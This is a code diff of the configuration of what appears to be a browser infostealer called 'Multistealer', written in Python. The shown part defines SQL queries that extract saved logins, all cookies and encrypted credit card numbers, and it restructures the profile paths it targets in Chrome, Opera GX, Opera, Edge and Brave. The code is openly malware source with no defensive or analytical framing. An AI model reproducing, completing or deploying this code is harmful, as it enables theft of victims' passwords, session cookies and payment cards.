@@ -10,7 +10,7 @@ user = GetUserName()
 @dataclass
 class ChromiumConfig:
 
-    Variables: tuple = ("browser_name", "storage_path", "storage_folder", "state_path", "cookies_path", "passwords_path", "cards_path", "alt_cookies_path", "statuses", "errors")
+    Variables: tuple = ("browser_name", "storage_path", "storage_folder", "state_path", "browser_path", "statuses", "errors")
     PasswordsSQL: str = "SELECT action_url, username_value, password_value FROM logins"
     CookiesSQL: str = "SELECT * FROM cookies"
     CardsSQL: str = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
@@ -27,42 +27,27 @@ class MultistealerConfig:
 
     ChromePaths: tuple = (
         rf"{environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Local State",
-        rf"{environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Default\Cookies",
-        rf"{environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Default\Login Data",
-        rf"{environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Default\Web Data",
-        rf"{environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
+        rf"{environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data",
     )
 
     OperaGXPaths: tuple = (
         rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera GX Stable\Local State",
-        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera GX Stable\Cookies",
-        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera GX Stable\Login Data",
-        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera GX Stable\Web Data",
-        ""
+        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera GX Stable",
     )
 
     OperaDefaultPaths: tuple = (
         rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera Stable\Local State",
-        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera Stable\Cookies",
-        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera Stable\Login Data",
-        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera Stable\Web Data",
-        ""
+        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera Stable",
     )
 
     MicrosoftEdgePaths: tuple = (
         rf"{environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data\Local State",
-        rf"{environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data\Default\Cookies",
-        rf"{environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
-        rf"{environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data\Default\Web Data",
-        rf"{environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies"
+        rf"{environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data",
     )
 
     BravePaths: tuple = (
         rf"{environ['USERPROFILE']}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State",
-        rf"{environ['USERPROFILE']}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
-        rf"{environ['USERPROFILE']}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
-        rf"{environ['USERPROFILE']}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data",
-        ""
+        rf"{environ['USERPROFILE']}\AppData\Local\BraveSoftware\Brave-Browser\User Data",
     )
 
 
